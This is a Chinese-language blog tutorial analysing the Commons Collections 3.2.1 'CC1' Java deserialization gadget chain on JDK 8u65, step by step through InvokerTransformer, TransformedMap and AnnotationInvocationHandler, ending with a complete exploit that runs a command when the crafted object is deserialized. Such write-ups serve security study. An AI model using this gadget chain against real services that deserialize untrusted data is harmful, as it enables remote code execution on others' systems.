---
layout: post
date: 2025-4-1
title: "CommonsCollections-CC1 分析"
author: "XinYiSleep"
---
<h1 id="lG0HX">一. 基础信息</h1>

```
jdk: 8u65
修复版本：8u71
jdkopen:https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4
commons-collections：3.2.1
maven:
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```
<h2 id="novcc">0x1.1: 环境搭建</h2>
```
这里直接去下载[openjdk](https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4),
因为sun包下面默认是class文件是要进行反编译，这里直接下载源文件,下载解压复制过去就行了，这个时候就
是java文件了,接着创建一个项目添加一下commons-collections包。
```
![](https://xinyisleep.github.io/img/2025/commons-collections/1.png)
![](https://xinyisleep.github.io/img/2025/commons-collections/2.png)
![](https://xinyisleep.github.io/img/2025/commons-collections/3.png)

<h1 id="m6L3f">二: 链查找</h1>
<h2 id="OQ4oi">0x2.1:危险方法查找</h2>

```
这里看了不少文章，就不罗嗦了，在Transformer接口中存在一个在transform看看哪里实现了他，
在InvokerTransformer类中实现了Serializable接口并且实现transform方法，里面进行了反射操作看下图和代码,
```

![](https://xinyisleep.github.io/img/2025/commons-collections/3.4.png)

![](https://xinyisleep.github.io/img/2025/commons-collections/3.5.jpg)

![](https://xinyisleep.github.io/img/2025/commons-collections/4.png)

```java
这里我们只需要看到126行就可以了,getClass获取类实例，在使用getMethod获取方法iMethodName，
iParamTypes是方法参数类型，invoke执行，input执行的类iArgs方法参数，那么如何控制iMethodName
他们呢，这里通过构造方法控制，看上图,这里从安全角度来说很后门的写法。

Class cls = input.getClass();
Method method = cls.getMethod(iMethodName, iParamTypes);
return method.invoke(input, iArgs);

下面我们通过这个反射执行命令。

Runtime r = Runtime.getRuntime(); 
new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);
```



<h2 id="xhdJd">0x2.2:初步查找链</h2>
```
下面我们就需要去找哪里调用了transform,需要找不同类的不同的方法如果同方法就没必要了因为没办法在网上走，
在TransformedMap类中存在一个checkSetValue方法调用了transform(图一),接着我们需要valueTransformer是InvokerTransformer类,
在构造方法中可以看到可以修改(图二)，但是存在一个问题我相信你也看到了,构造方法是protected那么就是找同类中调用构造方法或者子类父类,
在当前类中存在一个静态方法(图三)在里面实例化了TransformedMap,所以只需要执行这个静态类就可以控制valueTransformer，
但是又存在一个问题就是图一我们可以看到checkSetValue也protected，这里先使用反射模拟构造执行一下吧。
```

![](https://xinyisleep.github.io/img/2025/commons-collections/5.png)

![](https://xinyisleep.github.io/img/2025/commons-collections/6.png)

![](https://xinyisleep.github.io/img/2025/commons-collections/7.png)

```java
下面我们使用反射调用试试

Runtime r = Runtime.getRuntime();
InvokerTransformer exec = (InvokerTransformer)new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
Map decorate = TransformedMap.decorate(objectObjectHashMap, null, exec);
Class<? extends Map> aClass = decorate.getClass();
Method declaredMethod = aClass.getDeclaredMethod("checkSetValue", Object.class);
declaredMethod.setAccessible(true);
declaredMethod.invoke(decorate, r);
```

```
接着查看同类中或者子类父类中哪里调了checkSetValue，在父类AbstractInputCheckedMapDecorator中一个静态类中调用了checkSetValue,
其实你也发现了这里重载了呸重写了(重载是一个类中多个同名方法不通的参数类型数量顺序，重写是多态父类的方法子类重写让他执行新的行为)(图二)，
到这里其实有的人就有点蒙了哈，Map.Entry中存在一个setValue方法，这里的作用是从HashMap中设置的value,下面是一个例子,
既然知道了他是如何使用的那我们就去找哪里找执行for循环Map的操作并且执行了setValue，好我们先自己构造执行一下试试看下面代码。

```

```java
//Map.Entry中使用setValue执行
Object put = objectObjectHashMap.put("key", "value");
for(Map.Entry entry: objectObjectHashMap.entrySet()){
	if("key".equals(entry.getKey())){
		entry.setValue("aaaa");
		System.out.println(entry.getValue());
	}
}
//构造setValue执行
Runtime r = Runtime.getRuntime();
InvokerTransformer exec = (InvokerTransformer)new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
Object put = objectObjectHashMap.put("key", "value");
Map<Object, Object> decorate = TransformedMap.decorate(objectObjectHashMap, null, exec);
for(Map.Entry entry: decorate.entrySet()){
    entry.setValue(r);
}
```
![](https://xinyisleep.github.io/img/2025/commons-collections/8.png)
![](https://xinyisleep.github.io/img/2025/commons-collections/9.png)
```
到这里我们需要先整理一下思路,我们目前推进到这里的目的是想推到readObject,所以我们优先去找readObjec里面的，根据前辈们的找的是sun.reflect.annotation.AnnotationInvocationHandler
中调用了readObject并且执行了setValue(图一)，然而呢我们执行到setValue需要经过两个条件那我们挨个看看吧，第一个看下面代码获取一个type的注解(这里是从构造方法上面看出来的)
annotationType = AnnotationType.getInstance(type);
，type呢在构造方法中是可以控制的并且还需要修改memberValues是AbstractInputCheckedMapDecorator.TransformedMap类AbstractInputCheckedMapDecorator为啥不行是因为他是一个抽象类刚好TransformedMap继承了他(图二)，那我们使用反射去执行一下试试。
```

![](https://xinyisleep.github.io/img/2025/commons-collections/10.png)

![](https://xinyisleep.github.io/img/2025/commons-collections/11.png)

```java
Runtime r = Runtime.getRuntime();
InvokerTransformer exec = (InvokerTransformer)new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
Object put = objectObjectHashMap.put("value", "value");
Map<Object, Object> decorate = TransformedMap.decorate(objectObjectHashMap, null, exec);
Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
declaredConstructor.setAccessible(true);
Object o = declaredConstructor.newInstance(Retention.class, decorate);
serialize(o);
unserialize("ser.bin");

//        这里解释一下为什么是Retention注解因为获取了注解的所有成员变量看下图，并且
//        Object put = objectObjectHashMap.put("value", "value");
//        为啥key是value是因为需要获取到value才不为空，第2个参数decorate这也是因为继承
//        AbstractInputCheckedMapDecorator，所有就可以直接调过去了。
```

![](https://xinyisleep.github.io/img/2025/commons-collections/12.png)

![](https://xinyisleep.github.io/img/2025/commons-collections/13.png)

```
好了到这里我们还需要解决一个问题就是Runtime是不可以被反序列化的，好消息是class可以那么我们使用
InvokerTransformer.transform里面的代码实现一个Runtime的反射。
```

```java
Object transform = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
Object transform1 = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(transform);
InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
Object put = objectObjectHashMap.put("value", "value");
Map<Object, Object> decorate = TransformedMap.decorate(objectObjectHashMap, null, exec);
Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
declaredConstructor.setAccessible(true);
Object o = declaredConstructor.newInstance(Retention.class, decorate);
serialize(o);
unserialize("ser.bin");
```



<h1 id="mT0pb">三:最终的链子</h1>
<h2 id="eR9m8">0x3.1: exp</h2>

```
到这里你以为结束了吗？并没有老弟，我们还得需要解决最后最后一个问题，那就是SetValue里面的内容不可以控制，我们希望的内容是Runtime.class，看到这里不着急抽根烟喝口水，然后我们接着往下看，
ChainedTransformer中也会执行transform并且可以减少我们的代码量下面是修改后的(图一)，你心想我不想减少代码量你就告诉我怎么控制我们需要控制的地方，其实这一步是必要的为什么这么说接着往下看
ConstantTransformer(图二)，可以看到构造方法修改了一个属性，然后transform直接返回了，我相信你看我文章之前也看了别人的你应该最难理解的是这一块的意义在哪为什么修改这里Setvalue内容就可以控制了呢？
那是因为既然可以循环执行transform那么在执行到这个的时候虽然参数不可以控制但是我们修改了这里的属性直接给我return到下一次循环的时候object就已经被修改掉了所以这也是为什么修改这里就达到可控的目的（图三）。
```

```java
//我是修改后的
Transformer[] transformers = new Transformer[]{

new InvokerTransformer("getMethod",
        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
new InvokerTransformer("invoke"
        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```

![](https://xinyisleep.github.io/img/2025/commons-collections/14.png)

![](https://xinyisleep.github.io/img/2025/commons-collections/14.5.png)

![](https://xinyisleep.github.io/img/2025/commons-collections/15.png)

```
到这里就可以结束了 下面是完整的cc1链的exp,
new ConstantTransformer(Runtime.class),
这个就是控制SetValue的代码。
```

```java
Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Runtime.class),
new InvokerTransformer("getMethod",
        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
new InvokerTransformer("invoke"
        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Object transform = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
Object transform1 = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(transform);
InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
Object put = objectObjectHashMap.put("value", "value");
Map<Object, Object> decorate = TransformedMap.decorate(objectObjectHashMap, null, chainedTransformer);
Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
declaredConstructor.setAccessible(true);
Object o = declaredConstructor.newInstance(Retention.class, decorate);
serialize(o);
unserialize("ser.bin");
```

